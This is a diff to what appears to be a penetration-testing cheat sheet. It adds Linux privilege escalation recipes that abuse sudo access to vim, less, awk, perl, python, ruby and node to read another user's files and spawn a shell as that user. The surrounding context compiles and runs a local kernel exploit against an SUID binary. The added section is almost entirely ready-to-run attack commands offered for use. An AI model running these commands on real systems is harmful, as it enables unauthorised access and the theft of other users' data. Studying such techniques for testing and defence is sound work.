@@ -451,7 +451,57 @@ gcc 50808.c -o 50808
 ```bash
 ./50808 <SUID-FILE>
 ```
+- https://github.com/xairy/linux-kernel-exploitation
 
+### Vim Privile Escalation
+```bash
+sudo -l
+sudo -u user1 vim
+:r /home/user1/file.txt
+:!/bin/bash
+uid=1001(user1) gid=1001(user1) groups=1001(user1)
+```
+
+### Less Privile Escalation
+```bash
+sudo -l 
+sudo -u user1 less /home/user1/file.txt
+sudo -u user1 less /etc/passwd
+/home/user1/file.txt
+!/bin/bash
+```
+
+### Awk Privile Escalation
+```bash
+sudo -u user1 awk '{print $0}' /home/user1/file.txt
+sudo -u user1 awk '{system("/bin/bash")}'
+```
+
+### Perl Privile Escalation
+```bash
+sudo -u user1 perl -e 'print `cat /home/user1/file.txt`'
+sudo -u user1 perl -e '`/bin/bash`'
+```
+
+### Python Privile Escalation
+```bash
+sudo -u user1 python
+import os
+os.system('cat /home/user1/file.txt')
+os.system('/bin/bash')
+```
+
+### Ruby Privile Escalation
+```bash
+sudo -u user1 /usr/bin/ruby -e'puts `cat /home/user1/key.txt`'
+/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
+```
+
+### Node Privile Escalation
+```bash
+sudo -u user1 node -e 'var exec = require("child_process").exec;exec("cat /home/user1/key.txt", function (error, stdOut, stdErr) {console.log(stdOut);});'
+sudo -u user1 node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
 
 ### Linux Enumeration Tools [PrivEsc]
 -> Linpeas
